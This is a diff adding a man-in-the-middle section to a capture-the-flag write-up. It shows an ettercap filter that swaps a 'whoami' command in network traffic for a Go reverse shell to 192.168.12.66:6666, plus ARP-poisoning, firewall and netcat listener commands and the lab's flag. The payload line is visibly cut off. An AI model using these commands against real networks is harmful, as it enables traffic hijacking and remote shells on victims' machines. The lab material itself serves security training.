@@ -204,4 +204,28 @@ That how you can see, this will be a root.txt
 
 ![image](https://github.com/user-attachments/assets/5bd4c843-c263-4626-8c2b-7437ea431676)
 
+<h3>7.Man-in-the-Middle: Manipulation</h3>
 
+Task 1:What is the root.txt flag?
+Create the file whoami.ecf and insert there that shell.
+
+```
+if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
+    log(DATA.data, "/root/ettercap.log");
+    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run>    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
+}
+```
+we need to compile the.ecf into an .ef file:
+etterfilter whoami.ecf -o whoami.ef
+
+Disable ufw or create a corresponding allow rule; otherwise, Bob's reverse shell will be blocked by the firewall:
+```ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp```
+
+Run the netcat in secend window ```nc -nvlp 6666 &``` 
+run ettercap specifying your newly created etterfilter file: ```ettercap -T -i eth1 -M arp -F whoami.ef``` and wait until u will get a shell
+
+![image](https://github.com/user-attachments/assets/983f15fc-013c-477f-820c-3aef01e90f57)
+
+And we meade it, here's the flag:THM{wh4t_an_ev1l_M!tM_u_R}
+
+Thank you to everyone !
